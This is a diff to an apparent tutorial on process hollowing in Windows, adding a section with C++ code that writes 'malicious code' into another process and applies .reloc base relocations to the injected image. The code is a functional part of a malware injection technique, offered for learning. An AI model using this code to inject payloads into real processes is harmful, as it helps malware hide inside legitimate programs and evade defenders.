@@ -252,7 +252,7 @@ First, as we said before, we allocate space to contain our malicious code in the
 
 After that, we start to write our code PE headers and sections on the allocated memory using WriteProcessMemory(), taking as parameters the pbuffer ( holds our code ) and the base adress to where it should start writing.
 
-Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer and starting to write these headers from the adress which is the image base adress taken from the PEB  ```pPEB->ImageBaseAddress```
+Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer and starting to write these headers from the adress which is the image base adress taken from the PEB  ```pPEB->ImageBaseAddress```.
 
 ```cpp
 if (!WriteProcessMemory(
@@ -270,3 +270,83 @@ if (!WriteProcessMemory(
 Passing now to writing the sections, the for loop iterate trought the number of sections and write each one.
 Note that the line  ``` PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress); ``` serves the updated adress where we can write the coming sections ( it's like one under one ).
 
+### Adjust Base Adresses ( relocating : The hard part for me )
+
+It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
+The way to do this is by reconfiguring the relocation in .reloc section, dont worry if you didn't understand this, i'll make it easier, so let's get some information about .reloc section.
+
+The .reloc section in a part of PE file contains relocation information used by the windows loader when the executable is loaded into memory. This section is crucial when the executable is not loaded at its preferred base address, requiring adjustments to certain memory addresses within the code and data.
+
+For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes into play.
+
+These are some impotant topics to search about and take in consideration, now i want to ask about how really we gonna know if the relocation is necessary? the answer is quit simple, we calculate a difference called delta, it is a difference between the base addresses of the source image and the target process. If there is no difference, relocation is not necessary.
+
+now let's implement this on our code :
+
+```cpp
+    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
+    if (dwDelta)
+    {
+        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+        {
+            char* pSectionName = ".reloc";        
+
+            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+                continue;
+
+            printf("Rebasing image\r\n");
+
+            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
+            DWORD dwOffset = 0;
+
+            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+            while (dwOffset < relocData.Size)
+            {
+                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
+                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
+
+                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
+                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
+
+                for (DWORD y = 0; y <  dwEntryCount; y++)
+                {
+                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+                    if (pBlocks[y].Type == 0)
+                        continue;
+
+                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
+
+                    DWORD dwBuffer = 0;
+                    ReadProcessMemory(
+                        pProcessInfo->hProcess, 
+                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
+                        &dwBuffer,
+                        sizeof(DWORD),
+                        0
+                    );
+
+                    dwBuffer += dwDelta;
+
+                    BOOL bSuccess = WriteProcessMemory(
+                        pProcessInfo->hProcess,
+                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
+                        &dwBuffer,
+                        sizeof(DWORD),
+                        0
+                    );
+
+                    if (!bSuccess)
+                    {
+                        printf("Error writing memory\r\n");
+                        continue;
+                    }
+                }
+            }
+
+            break;
+        }
+    }
+```
+so this part is a little bit sneaky, we just check if the delta (dwDelta) is equal 0 or not. If not, we iterate over the sections to look for the .reloc section
